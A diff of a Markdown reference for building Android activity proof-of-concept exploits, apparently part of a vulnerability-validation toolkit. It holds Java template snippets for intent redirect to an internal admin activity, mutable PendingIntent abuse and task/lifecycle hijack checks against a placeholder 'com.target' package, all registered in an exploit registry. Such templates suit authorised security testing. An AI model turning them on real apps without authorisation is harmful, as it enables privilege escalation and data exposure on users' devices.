@@ -7,6 +7,14 @@ description: Activity PoC reference covering exported access, intent redirect, f
 
 Use this reference for attacker-reachable activity flows. Activity PoCs usually fit `direct-trigger`, `returned-handle`, or `ui-assisted` mode.
 
+## Template Wiring
+
+These snippets show the execution body shape, not the full class shape. In the current template:
+
+- put the execution body in a helper method or lambda
+- register it in `ExploitRegistry`
+- let `PoCActivity` handle both button execution and `?exploit=<id>` route execution
+
 ## Construction Matrix
 
 | Vulnerability | Exploit mode | Typical support | Visible success |
@@ -34,24 +42,25 @@ Use this reference for attacker-reachable activity flows. Activity PoCs usually 
 Use for exported access, intent redirect, fragment injection, and many path-traversal cases.
 
 ```java
-public final class ActivityIntentRedirectExploit extends Exploit {
-    public ActivityIntentRedirectExploit(Context context) {
-        super(context);
-    }
+private static void runActivityIntentRedirect(Context context) {
+    Intent nested = new Intent();
+    nested.setClassName("com.target", "com.target.InternalAdminActivity");
+    nested.putExtra("admin_cmd", "grant_permission");
 
-    @Override
-    public void execute() {
-        Intent nested = new Intent();
-        nested.setClassName("com.target", "com.target.InternalAdminActivity");
-        nested.putExtra("admin_cmd", "grant_permission");
+    Intent intent = new Intent();
+    intent.setClassName("com.target", "com.target.ForwardActivity");
+    intent.putExtra("forward_intent", nested);
+    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+    context.startActivity(intent);
+    Log.i("PoC", "Launched ForwardActivity with nested attacker-controlled Intent");
+}
+```
 
-        Intent intent = new Intent();
-        intent.setClassName("com.target", "com.target.ForwardActivity");
-        intent.putExtra("forward_intent", nested);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        context.startActivity(intent);
-        log("Launched com.target.ForwardActivity with nested attacker-controlled Intent");
-    }
+Registration shape:
+
+```java
+static {
+    register("activity-launch", "Launch Exported Activity", () -> runActivityIntentRedirect(appContext));
 }
 ```
 
@@ -61,35 +70,41 @@ Fill with:
 - real nested Intent key or fragment selector
 - real path, URI, or command extras from the verified finding
 
-## Pattern 2 - Returned Handle or Result Flow
+Use when:
 
-Use for `ActivityPendingIntentAbuseExploit` or `ActivitySetResultLeakExploit`.
+- the vulnerable path is proven by one `startActivity(...)`
+- no result-capture or helper UI flow is required
+
+## Pattern 2 - Returned Handle Or Result Flow
+
+Use for mutable `PendingIntent` delivery or `setResult()` leakage.
 
 ```java
-public final class ActivityPendingIntentAbuseExploit extends Exploit {
-    public ActivityPendingIntentAbuseExploit(Context context) {
-        super(context);
-    }
+private static void runActivityPendingIntentAbuse(Context context) {
+    Intent malicious = new Intent();
+    malicious.setClassName("com.target", "com.target.PrivilegedActivity");
 
-    @Override
-    public void execute() {
-        Intent malicious = new Intent();
-        malicious.setClassName("com.target", "com.target.PrivilegedActivity");
+    PendingIntent pendingIntent = PendingIntent.getActivity(
+        context,
+        0,
+        malicious,
+        PendingIntent.FLAG_MUTABLE
+    );
 
-        PendingIntent pendingIntent = PendingIntent.getActivity(
-            context,
-            0,
-            malicious,
-            PendingIntent.FLAG_MUTABLE
-        );
+    Intent intent = new Intent();
+    intent.setClassName("com.target", "com.target.ExecutePendingIntentActivity");
+    intent.putExtra("pending_intent", pendingIntent);
+    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+    context.startActivity(intent);
+    Log.i("PoC", "Delivered attacker-controlled PendingIntent to exported activity");
+}
+```
 
-        Intent intent = new Intent();
-        intent.setClassName("com.target", "com.target.ExecutePendingIntentActivity");
-        intent.putExtra("pending_intent", pendingIntent);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        context.startActivity(intent);
-        log("Delivered attacker-controlled PendingIntent to exported activity");
-    }
+Registration shape:
+
+```java
+static {
+    register("activity-handle", "Deliver Returned Handle", () -> runActivityPendingIntentAbuse(appContext));
 }
 ```
 
@@ -98,35 +113,37 @@ Use when:
 - the activity accepts a `PendingIntent` from an external caller, or
 - the activity returns sensitive data via `setResult()` and the PoC can capture it with a helper activity
 
-Manifest support for `setResult()`:
+Fill with:
 
-- add a helper capture activity if the result must be programmatically observed
+- real returned-handle extra key or capture source
+- real helper activity shape if result capture is required
 
 ## Pattern 3 - UI-Assisted Validation
 
 Use for task hijack, clickjacking, and lifecycle misuse.
 
 ```java
-public final class ActivityLifecycleExploit extends Exploit {
-    public ActivityLifecycleExploit(Context context) {
-        super(context);
-    }
+private static void runActivityLifecycleMisuse(Context context) {
+    Intent camera = new Intent();
+    camera.setClassName("com.target", "com.target.CameraActivity");
+    camera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+    context.startActivity(camera);
 
-    @Override
-    public void execute() {
-        Intent camera = new Intent();
-        camera.setClassName("com.target", "com.target.CameraActivity");
-        camera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        context.startActivity(camera);
+    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+        Intent home = new Intent(Intent.ACTION_MAIN);
+        home.addCategory(Intent.CATEGORY_HOME);
+        home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(home);
+        Log.i("PoC", "Moved target activity to background. Check whether the protected resource remains active.");
+    }, 2000);
+}
+```
 
-        new Handler().postDelayed(() -> {
-            Intent home = new Intent(Intent.ACTION_MAIN);
-            home.addCategory(Intent.CATEGORY_HOME);
-            home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(home);
-            log("Moved target activity to background. Check whether the protected resource remains active.");
-        }, 2000);
-    }
+Registration shape:
+
+```java
+static {
+    register("activity-ui", "Run UI-Assisted Validation", () -> runActivityLifecycleMisuse(appContext));
 }
 ```
 
@@ -135,4 +152,14 @@ Manifest support:
 - helper activity with matching `taskAffinity` for task hijack
 - helper service with overlay permission for clickjacking
 
+Use when:
+
+- the finding depends on visible task placement, overlay timing, or lifecycle state changes
+
 Do not use `ui-assisted` mode for ordinary exported launches that already prove the bug.
+
+## Construction Notes
+
+- prefer one direct launch helper when the bug is already visible on first open
+- only add helper activities or services when result capture or UI placement is part of the verified path
+- keep nested `Intent`, fragment selector, or path extras explicit in the helper body instead of hiding them behind generic wrappers
